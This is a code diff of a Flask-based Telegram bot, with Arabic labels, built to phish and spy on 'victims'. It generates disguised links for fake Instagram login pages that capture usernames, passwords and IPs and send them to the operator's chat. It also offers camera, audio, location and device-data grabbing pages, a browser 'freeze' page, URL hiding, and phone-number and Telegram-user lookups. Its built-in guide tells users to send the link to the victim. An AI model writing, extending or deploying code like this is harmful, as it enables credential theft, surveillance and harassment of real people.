@@ -1,8 +1,10 @@
 import requests
-from flask import Flask, request, render_template_string, redirect, send_file
+from flask import Flask, request, render_template_string, redirect
 import base64
 import random
 import string
+import phonenumbers
+from phonenumbers import geocoder, carrier
 
 app = Flask(__name__)
 
@@ -30,33 +32,38 @@ def answer_callback(callback_id):
     except Exception as e:
         print(f"Error: {e}")
 
+def decorate_text(text):
+    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    bold = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
+    trans = str.maketrans(normal, bold)
+    return text.translate(trans)
+
 def main_menu():
     return {
         "inline_keyboard": [
-            [{"text": "🎥 تصوير الضحية فيديو (تجميد)", "callback_data": "freeze"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
+            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
             [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
             [{"text": "🕵️‍♂️ أختراق كاميرا المراقبة", "callback_data": "v5"}, {"text": "🌍 أختراق الموقع", "callback_data": "v6"}],
-            [{"text": "🟩 اغلااق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
+            [{"text": "🟩 اغلاق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
             [{"text": "📸 أختراق انستغرام", "callback_data": "insta"}, {"text": "💻 أختراق تيك توك", "callback_data": "v9"}],
             [{"text": "👻 أختراق سناب شات", "callback_data": "v10"}, {"text": "📘 أختراق فيسبوك", "callback_data": "v11"}],
             [{"text": "🐦 أختراق تويتر", "callback_data": "v12"}, {"text": "🔴 أختراق يوتيوب", "callback_data": "v13"}],
             [{"text": "💎 أختراق فري فاير", "callback_data": "v14"}, {"text": "💵 أختراق ببجي", "callback_data": "v15"}],
             [{"text": "😂 اعطيني نكته", "callback_data": "joke"}],
-            [{"text": "⛔ أختراق الهاتف كاملاً (فرمتة)", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
+            [{"text": "⛔ أختراق الهاتف كاملاً", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
             [{"text": "🛑 المزيد من المميزات", "callback_data": "more"}],
             [{"text": "📺 أختراق بت التلفزيون", "callback_data": "v18"}, {"text": "📻 أختراق بت الريدو", "callback_data": "v19"}],
             [{"text": "📱 معلومات انستا وتيك توك", "callback_data": "v20"}, {"text": "☠️ بوت أختراق", "callback_data": "v21"}],
             [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
-            [{"text": "👁 البحث عن المستخدم", "callback_data": "v24"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
-            [{"text": "🔍 بحث حساب تيلكرام من id", "callback_data": "v26"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
-            [{"text": "🖼 بحث عن الصور", "callback_data": "v28"}, {"text": "📝 زخرفة", "callback_data": "v29"}],
+            [{"text": "👁 البحث عن المستخدم", "callback_data": "search_user"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
+            [{"text": "🔍 كاشف الأرقام (تيك توك/تلجرام)", "callback_data": "phone_search"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
+            [{"text": "🖼 بحث عن الصور", "callback_data": "v28"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
             [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
-            [{"text": "📖 شرح استخدام البوت", "callback_data": "v31"}, {"text": "📞 تواصل مع المطور", "callback_data": "v32"}]
+            [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}, {"text": "📞 تواصل مع المطور", "callback_data": "dev"}]
         ]
     }
 
-# ============= المسارات (Routes) =============
-
+# ============= المسارات =============
 @app.route('/s/<code>')
 def redirect_short(code):
     url = short_links.get(code)
@@ -101,10 +108,8 @@ def login():
     admin_id = request.form.get('admin_id')
     target = request.form.get('target')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
     msg = f"🚨 *صيدة جديدة!*\n🎯 الهدف: `{target}`\n👤 اليوزر: `{username}`\n🔑 الباسورد: `{password}`\n🌐 IP: `{ip}`"
-    if admin_id:
-        send_message(admin_id, msg)
+    if admin_id: send_message(admin_id, msg)
     return redirect("https://www.instagram.com")
 
 @app.route('/camera')
@@ -295,7 +300,6 @@ def format_page():
     </html>
     """, admin=admin, target=target)
 
-# مسار فيروس التجميد
 @app.route('/freeze')
 def freeze_page():
     admin = request.args.get('admin', '')
@@ -344,7 +348,6 @@ def collect_freeze():
     target = data.get('target')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip and ',' in ip: ip = ip.split(',')[0].strip()
-
     msg = f"❄️ *الضحية فتح رابط التجميد!*\n🎯 الهدف: `{target}`\n🌐 الـ IP: `{ip}`\n📱 جاري تجميد المتصفح الآن..."
     if admin_id: send_message(admin_id, msg)
     return "ok", 200
@@ -369,12 +372,12 @@ def webhook():
             action = state_data['action']
             target = text
             
-            if action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
-            elif action == 'camera': link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
+            if action == 'camera': link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
             elif action == 'device': link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
-            elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
             elif action == 'format': link = f"{BASE_URL}/format?target={target}&admin={chat_id}"
             elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
+            elif action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
+            elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
                 
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
@@ -398,6 +401,64 @@ def webhook():
             short_url = f"{BASE_URL}/s/{code}"
             send_message(chat_id, f"✅ تم إخفاء الرابط بنجاح:\n\n`{short_url}`")
             del user_state[chat_id]
+
+        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_decor':
+            decorated = decorate_text(text)
+            send_message(chat_id, f"✨ النص المزخرف:\n\n{decorated}")
+            del user_state[chat_id]
+            
+        elif user_state.get(chat_id, {}).get('state') == 'waiting_username':
+            username = text.replace('@', '').strip()
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat?chat_id=@{username}"
+            try:
+                res = requests.get(url, timeout=5).json()
+                if res.get('ok'):
+                    data = res['result']
+                    user_id = data.get('id')
+                    first_name = data.get('first_name', '')
+                    last_name = data.get('last_name', '')
+                    type_ = data.get('type')
+                    full_name = f"{first_name} {last_name}".strip()
+                    
+                    msg_info = f"👁 *نتائج البحث:*\n\n🆔 الآيدي: `{user_id}`\n👤 الاسم: `{full_name}`\n🏷️ اليوزر: `@{username}`\n📌 النوع: `{type_}`"
+                    send_message(chat_id, msg_info)
+                else:
+                    send_message(chat_id, "❌ المستخدم غير موجود أو الحساب مخفي (لا يملك يوزر عام).")
+            except:
+                send_message(chat_id, "❌ حدث خطأ أثناء الاتصال بسيرفرات تيليجرام.")
+            del user_state[chat_id]
+
+        elif user_state.get(chat_id, {}).get('state') == 'waiting_phone_search':
+            phone_num = text.replace(" ", "").replace("-", "")
+            if not phone_num.startswith("+"):
+                phone_num = "+" + phone_num
+
+            # تنظيف الرقم لبعض الروابط اللي مش بتقبل +
+            clean_num = phone_num.replace("+", "")
+
+            try:
+                # جلب الدولة والشبكة
+                parsed_num = phonenumbers.parse(phone_num, None)
+                country = geocoder.description_for_number(parsed_num, "ar")
+                car = carrier.name_for_number(parsed_num, "ar")
+                
+                # تجهيز التقرير المفصل
+                report = (
+                    f"📱 *تقرير فحص الرقم:* `{phone_num}`\n\n"
+                    f"🌍 الدولة: `{country}`\n"
+                    f"📡 الشبكة: `{car if car else 'غير معروف'}`\n\n"
+                    f"🔍 *اضغط على المنصة للبحث:*\n"
+                    f"👤 [كاشف الأرقام (Truecaller)](https://www.truecaller.com/search/global/{phone_num})\n"
+                    f"🎵 [تيك توك](https://www.tiktok.com/search/user?q={phone_num})\n"
+                    f"✈️ [تيليجرام](https://t.me/{phone_num})\n"
+                    f"📘 [فيسبوك](https://www.facebook.com/search/top?q={phone_num})\n"
+                    f"🟢 [واتساب](https://wa.me/{clean_num})\n"
+                    f"🌐 [بحث جوجل](https://www.google.com/search?q={phone_num})"
+                )
+                send_message(chat_id, report)
+            except Exception as e:
+                send_message(chat_id, "❌ الرقم غير صالح أو تنسيقه غلط (مثال: +967770000000).")
+            del user_state[chat_id]
     
     if 'callback_query' in update:
         cb = update['callback_query']
@@ -407,10 +468,8 @@ def webhook():
         
         answer_callback(cb_id)
         
-        if data == 'joke': send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
-        elif data == 'insta':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
-            send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
+        if data == 'joke': 
+            send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
         elif data == 'cam':
             user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'camera'}
             send_message(chat_id, "📷 أرسل اسم الضحية لإنشاء رابط الكاميرا:")
@@ -429,9 +488,22 @@ def webhook():
         elif data == 'v16':
             user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'format'}
             send_message(chat_id, "⛔ أرسل اسم الضحية لإنشاء رابط الفرمتة:")
-        elif data == 'freeze':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'freeze'}
-            send_message(chat_id, "❄️ أرسل اسم الضحية لإنشاء رابط التجميد:")
+        elif data == 'decor':
+            user_state[chat_id] = {'state': 'waiting_for_decor'}
+            send_message(chat_id, "📝 أرسل النص الذي تريد زخرفته:")
+        elif data == 'guide':
+            send_message(chat_id, "📖 شرح استخدام البوت:\n1. اختر الخدمة المطلوبة.\n2. أرسل اسم الضحية.\n3. انسخ الرابط وأرسله للضحية.")
+        elif data == 'dev':
+            send_message(chat_id, "📞 للتواصل مع المطور:\n@YourUsername")
+        elif data == 'insta':
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
+            send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
+        elif data == 'search_user':
+            user_state[chat_id] = {'state': 'waiting_username'}
+            send_message(chat_id, "👁 أرسل يوزر تيليجرام الذي تريد البحث عنه (بدون @):")
+        elif data == 'phone_search':
+            user_state[chat_id] = {'state': 'waiting_phone_search'}
+            send_message(chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة (مثال: +967770000000):")
         else:
             send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
             
